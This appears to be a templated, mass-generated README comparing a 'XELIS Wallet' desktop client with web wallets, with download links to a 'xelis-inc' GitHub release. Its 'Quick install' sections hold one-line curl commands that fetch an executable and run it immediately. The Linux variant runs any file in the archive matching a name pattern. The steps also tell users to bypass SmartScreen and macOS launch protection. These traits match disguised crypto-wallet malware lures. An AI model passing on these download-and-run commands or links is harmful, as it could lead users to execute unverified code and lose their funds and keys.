![XELIS Wallet or a web wallet: desktop trade-offs](assets/banner-article.png)
# XELIS Wallet or a web wallet: desktop trade-offs

Where the keys live, who can change the code, and what each convenience costs.

## Downloads - Clients

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> With a web wallet you trust a page on every visit. With a desktop wallet you trusted a file once.

A desktop client is installed once, keeps keys in local encrypted storage and depends on the release you installed. A web wallet runs from a page you load each time, so its integrity depends on that page and the browser session. The trade is convenience against a smaller attack surface.

<!-- ARTICLE-BODY-BEGIN -->
## The difference that decides it

A desktop client is a program on your disk. The code that handles your keys is the code you installed, and it changes only when you install an update you chose. A web wallet is served fresh on each visit: the page can change without your knowledge, and the keys sit in a browser session that other tabs and extensions share.

That is the whole argument, and it is not a claim that one category is broken. It is a statement about which party can change the software under you, and when.

## What the desktop route costs

You install it, you update it, and you keep the operating system patched. The install is one verified download, described in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-windows-download-install.md">install XELIS Wallet on Windows</a>, and updates are a repeat of that with a backup first.

The cost is maintenance. The benefit is that your keys live in local encrypted storage rather than in whatever the page decided to do this morning.

## What the web route costs

A web wallet is convenient: nothing to install, works on a borrowed machine, and the page is always current. Those are real advantages, and they come with page integrity as a permanent risk. A phishing copy, a compromised script or a malicious extension looks exactly like the real thing.

If you use one, verify the address every time, keep the amounts small, and treat the phrase with the same care as on a desktop. Convenience does not change the backup rules.

## Which fits

Choose the desktop client when the machine is yours, the balance is meaningful and you can keep the OS updated. Choose a web wallet for a small, temporary balance on a machine you do not control, and accept the trade.

Neither choice affects custody: both are self-custodial if you hold the phrase. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md">XELIS Wallet self-custody</a> covers that side of the decision.

If you are choosing between installed clients rather than client types, <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-or-genesix-client.md">XELIS Wallet or Genesix</a> is the comparison you want.

There is no browser build of this release, so the web option is a different product by definition, not a lighter version of the same app; the desktop build itself comes from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> linked in the table above.

## FAQ
### What kind of wallet is best for crypto?
The kind that matches your machine and your risk: an installed client for a machine you control, a web wallet only for small temporary balances.

### Is a desktop wallet better than a web wallet for XEL?
For meaningful balances on a machine you control, yes: the code is fixed until you update it. A web wallet wins on convenience, not on integrity.

### Is there a XELIS Wallet web version?
No. This release is a desktop application for Windows, macOS and Linux; there is no browser build.

### Do web wallets hold my keys?
Some do and some do not. A self-custodial web wallet keeps keys in the browser session, which is why the page's integrity matters so much.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Install XELIS Wallet on Windows](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-windows-download-install.md)
- [XELIS Wallet self-custody](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md)
- [XELIS Wallet or Genesix](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-or-genesix-client.md)
- [Private wallet basics](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-private-wallet-basics.md)
